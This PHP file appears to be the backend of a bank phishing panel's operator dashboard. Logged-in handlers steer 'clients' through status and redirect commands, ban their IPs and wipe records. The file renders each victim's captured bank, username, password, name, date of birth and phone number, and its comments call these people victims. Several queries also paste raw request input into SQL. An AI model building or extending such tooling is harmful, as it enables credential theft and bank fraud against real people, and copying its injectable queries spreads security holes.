			$array = mysqli_fetch_array($query,MYSQLI_ASSOC);
			echo $array['status'];
		}		
		
	}

}




if($_SESSION['loggedin'] == 'true'){
	
	
if ($_GET['type'] == 'commmand') {
    if (!empty($_POST['userid']) && isset($_POST['status'])) {
        $userid = $_POST['userid'];
        $status = $_POST['status'];
        $handler = $_SESSION['username'];
        $amount = isset($_POST['amount']) ? $_POST['amount'] : ''; // Handle missing 'amount' gracefully

        // Prepare the query
        if ($amount != '') {
            $query = mysqli_query($conn, "UPDATE clients SET handler='$handler', status=$status, buzzed=1, input_amount='$amount' WHERE id=$userid");
        } else {
            $query = mysqli_query($conn, "UPDATE clients SET handler='$handler', status=$status, buzzed=1 WHERE id=$userid");
        }

        // Check if the query was successful
        if ($query) {
            echo json_encode(array('status' => 'ok'));
        } else {
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        echo json_encode(array('status' => 'notokk'));
    }
}


if ($_GET['type'] == 'onecommmandredirect') {
    if (!empty($_POST['userid']) && !empty($_POST['status'])) {
        $userid = $_POST['userid'];
        $status = $_POST['status'];
        $handler = $_SESSION['username'];

        // Get 'home' parameter, which could be empty or null
        $home = isset($_POST['home']) ? $_POST['home'] : '';

        // Prepared statement to prevent SQL injection
        if ($home !== '') {
            $query = mysqli_prepare($conn, "UPDATE clients SET handler=?, status=?, buzzed=1, custom_redirect=? WHERE id=?");
            mysqli_stmt_bind_param($query, "sssi", $handler, $status, $home, $userid);
        } else {
            $query = mysqli_prepare($conn, "UPDATE clients SET handler=?, status=?, buzzed=1, custom_redirect=NULL WHERE id=?");
            mysqli_stmt_bind_param($query, "ssi", $handler, $status, $userid);
        }

        if (mysqli_stmt_execute($query)) {
            // Store the home value in the session if provided
            $_SESSION['home'] = $home;
            echo json_encode(array('status' => 'ok'));
        } else {
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        echo json_encode(array('status' => 'notokk'));
    }
}



if ($_GET['type'] == 'onecommmand') {
    if (!empty($_POST['userid']) && !empty($_POST['status'])) {
        $userid = $_POST['userid'];
        $status = $_POST['status'];
        $handler = $_SESSION['username'];

        // Get 'home' parameter, which could be empty or null
        $home = isset($_POST['home']) ? $_POST['home'] : '';

        // Prepared statement to prevent SQL injection
        if ($home !== '') {
            $query = mysqli_prepare($conn, "UPDATE clients SET handler=?, status=?, buzzed=1, home=? WHERE id=?");
            mysqli_stmt_bind_param($query, "sssi", $handler, $status, $home, $userid);
        } else {
            $query = mysqli_prepare($conn, "UPDATE clients SET handler=?, status=?, buzzed=1, home=NULL WHERE id=?");
            mysqli_stmt_bind_param($query, "ssi", $handler, $status, $userid);
        }

        if (mysqli_stmt_execute($query)) {
            // Store the home value in the session if provided
            $_SESSION['home'] = $home;
            echo json_encode(array('status' => 'ok'));
        } else {
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        echo json_encode(array('status' => 'notokk'));
    }
}


	
	
if ($_GET['type'] == 'onecommmandlive') {
    if (!empty($_POST['userid']) && !empty($_POST['status'])) {
        $userid = $_POST['userid'];
        $status = $_POST['status'];
        $handler = $_SESSION['username'];

        // Get 'homelive' parameter, which could be empty or null
        $homelive = isset($_POST['homelive']) ? $_POST['homelive'] : '';

        // Prepared statement to prevent SQL injection
        if ($homelive !== '') {
            $query = mysqli_prepare($conn, "UPDATE clients SET handler=?, status=?, buzzed=1, homelive=? WHERE id=?");
            mysqli_stmt_bind_param($query, "sssi", $handler, $status, $homelive, $userid);
        } else {
            $query = mysqli_prepare($conn, "UPDATE clients SET handler=?, status=?, buzzed=1, homelive=NULL WHERE id=?");
            mysqli_stmt_bind_param($query, "ssi", $handler, $status, $userid);
        }

        if (mysqli_stmt_execute($query)) {
            // Store the homelive value in the session if provided
            $_SESSION['homelive'] = $homelive;
            echo json_encode(array('status' => 'ok'));
        } else {
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        echo json_encode(array('status' => 'notokk'));
    }
}

	
	
	
	




if ($_GET['type'] == 'buzzoff') {
    // Check current state of buzzed alerts (are they all paused or active)
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE buzzed = 0");

    if (mysqli_num_rows($query) > 0) {
        // If there are clients with buzzed=0, it means we need to "buzz" them all
        $queryy = mysqli_query($conn, "UPDATE clients SET buzzed=1 WHERE buzzed=0");
        if ($queryy) {
            echo json_encode(array(
                'status' => 'ok',
                'action' => 1 // Action 1 means all clients are now "buzzed" (alert paused)
            ));
        } else {
            echo json_encode(array(
                'status' => 'notok',
                'action' => 0 // Action 0 means the operation failed
            ));
        }
    } else {
        // If there are no clients with buzzed=0, it means we need to "unbuzz" them
        $queryy = mysqli_query($conn, "UPDATE clients SET buzzed=0 WHERE buzzed=1");
        if ($queryy) {
            echo json_encode(array(
                'status' => 'ok',
                'action' => 0 // Action 0 means all clients are now "unbuzzed" (alerts resumed)
            ));
        } else {
            echo json_encode(array(
                'status' => 'notok',
                'action' => 0 // Action 0 means the operation failed
            ));
        }
    }
}



if ($_GET['type'] == 'buzzoffsingle') {
    $userid = $_GET['userid'];
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE id = $userid");
    if (mysqli_num_rows($query) >= 1) {
        $row = mysqli_fetch_assoc($query);
        $newBuzzedState = ($row['buzzed'] == 0) ? 1 : 0; // Toggle buzzed state

        $queryy = mysqli_query($conn, "UPDATE clients SET buzzed = $newBuzzedState WHERE id = $userid");
        if ($queryy) {
            echo json_encode(array(
                'status' => 'ok'
            ));
        } else {
            echo json_encode(array(
                'status' => 'notok'
            ));
        }
    } else {
        echo json_encode(array('status' => 'notfound')); // Victim not found
    }
}


	
if ($_GET['type'] == 'remove') {
    $start_time = microtime(true);

    if ($_POST['userid'] && is_numeric($_POST['userid'])) {
        $userid = $_POST['userid'];

        $query_start = microtime(true);
        $query = mysqli_query($conn, "DELETE FROM clients WHERE id=$userid");
        $query_time = microtime(true) - $query_start;

        if ($query) {
            $total_time = microtime(true) - $start_time;
            error_log("Delete query took: {$query_time}s | Total: {$total_time}s");

            echo json_encode(['status' => 'ok']);
        } else {
            error_log("Delete query failed: " . mysqli_error($conn));
            echo json_encode(['status' => 'notok']);
        }
    } else {
        echo json_encode(['status' => 'notokk']);
    }
}





	if($_GET['type'] == 'remove_handler'){
		if($_POST['userid'] and numeric($_POST['userid']) == true){
			$userid = $_POST['userid'];
			
			$query = mysqli_query($conn, "DELETE FROM handlers WHERE id=$userid");
			if($query){
				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'notok'
				));
			}
		}else{
			echo json_encode(array(
				'status' => 'notokk'
			));
		}
	}



if ($_GET['type'] == 'ban') {
    if (isset($_POST['userid']) && is_numeric($_POST['userid'])) {
        $userid = $_POST['userid'];

        // Prevent SQL injection
        $userid = mysqli_real_escape_string($conn, $userid);

        // Update the user's status to 'banned'
        $query = mysqli_query($conn, "UPDATE clients SET status=99, buzzed=1 WHERE id='$userid'");
        
        if ($query) {
            // Retrieve the user's information for IP blocking
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE id='$userid'");
            if ($query && mysqli_num_rows($query) > 0) {
                $row = mysqli_fetch_assoc($query);
                $ipblock = $row['ip'];

                // Get current blacklist data
                $ipslist = file_get_contents("blacklist.dat");

                // Block the IP only if it isn't already blacklisted
                if (strpos($ipslist, $ipblock) === false) {
                    file_put_contents("blacklist.dat", $ipblock . "\n", FILE_APPEND);
                }

                // Return success
                echo json_encode(array('status' => 'ok'));
            } else {
                // Return error if user not found
                echo json_encode(array('status' => 'notfound'));
            }
        } else {
            // Return error if update failed
            echo json_encode(array('status' => 'notok'));
        }
    } else {
        // Invalid user ID
        echo json_encode(array('status' => 'notokk', 'message' => 'Invalid user ID'));
    }
}



if ($_GET['type'] == 'visits_reset') {
    $query = mysqli_query($conn, "DELETE FROM visits");

    if ($query) {
        echo json_encode(array(
            'status' => 'ok'
        ));
    } else {
        echo json_encode(array(
            'status' => 'notok'
        ));
    }
}




// action.php  (inside your dispatcher)
if (isset($_GET['type']) && $_GET['type'] === 'clearlogs') {
    header('Content-Type: application/json; charset=utf-8');
    ini_set('display_errors', 0);
    error_reporting(E_ALL);

    mysqli_begin_transaction($conn);

    // Wipe clients
    if (!mysqli_query($conn, "TRUNCATE TABLE clients")) {
        // Fallback if blocked by FKs/permissions
        if (!mysqli_query($conn, "DELETE FROM clients")) {
            $err = mysqli_error($conn);
            mysqli_rollback($conn);
            echo json_encode(['status' => 'notok', 'message' => 'wipe failed', 'dberr' => $err]);
            exit;
        }
    }

    mysqli_commit($conn);
    echo json_encode(['status' => 'ok']);
    exit;
}


if ($_GET['type'] == 'getallinfo') {
    $query = mysqli_query($conn, "SELECT * FROM clients");

    if ($query && mysqli_num_rows($query) > 0) {
        $allinfo = ''; // Initialize variable to hold all rows

        // Loop through each row in the result set
        while ($array = mysqli_fetch_array($query, MYSQLI_ASSOC)) {
            $allinfo .= "

  <table style='width: 100%; border-collapse: separate; border-spacing: 0; font-family: \"Inter\", -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif; box-shadow: var(--shadow-lg); border-radius: 16px; overflow: hidden;'>
    
    <!-- User Information Section -->
    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>Bank</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['description']}</td>
    </tr>

      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>Username</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['user']}</td>
    </tr>
    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>Password</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['pass']}</td>
    </tr>

    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>FullName</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['fullname']}</td>
    </tr>
    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>DOB</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['dob']}</td>
    </tr>
    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>Phone</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['phonenumber']}</td>
    </tr>


  </table>
";
        }

        echo json_encode([
            'status' => 'ok',
            'info' => $allinfo
        ]);
    } else {
        echo json_encode([
            'status' => 'notfound',
            'message' => 'No data found in the database'
        ]);
    }
}

if ($_GET['type'] == 'getinfo') {
    // Ensure 'userid' is present and is numeric
    if (isset($_POST['userid']) && is_numeric($_POST['userid'])) {
        $userid = $_POST['userid'];

        // Prevent SQL injection by escaping the user input
        $userid = mysqli_real_escape_string($conn, $userid);

        // Query the database for the victim's data
        $query = mysqli_query($conn, "SELECT * FROM clients WHERE id='$userid'");

        // Check if the query returns any result
        if ($query && mysqli_num_rows($query) > 0) {
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            // Construct the victim information with improved style
$allinfo = "

  <table style='width: 100%; border-collapse: separate; border-spacing: 0; font-family: \"Inter\", -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif; box-shadow: var(--shadow-lg); border-radius: 16px; overflow: hidden;'>
    
    <!-- User Information Section -->
    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>Bank</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['description']}</td>
    </tr>

      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>Username</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['user']}</td>
    </tr>
    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>Password</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['pass']}</td>
    </tr>

    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>FullName</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['fullname']}</td>
    </tr>
    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>DOB</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['dob']}</td>
    </tr>
    <tr>
      <td style='padding: 1rem; width: 30%; color: var(--text-secondary); background: var(--darker-bg); border: 1px solid var(--border-color); font-weight: 600; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 0.5px;'>Phone</td>
      <td style='padding: 1rem; width: 70%; color: var(--text-primary); background: var(--card-bg); border: 1px solid var(--border-color); font-weight: 500;'>{$array['phonenumber']}</td>
    </tr>


  </table>
";

            // Send the response with victim info
            echo json_encode(array(
                'status' => 'ok', 
                'info' => $allinfo
            ));

        } else {
            // If no results were found
            echo json_encode(array(
                'status' => 'notfound',
                'message' => 'Victim not found'
            ));
        }
    } else {
        // If userid is invalid or not set
        echo json_encode(array(
            'status' => 'notokk',
            'message' => 'Invalid user ID'
        ));
    }
}

}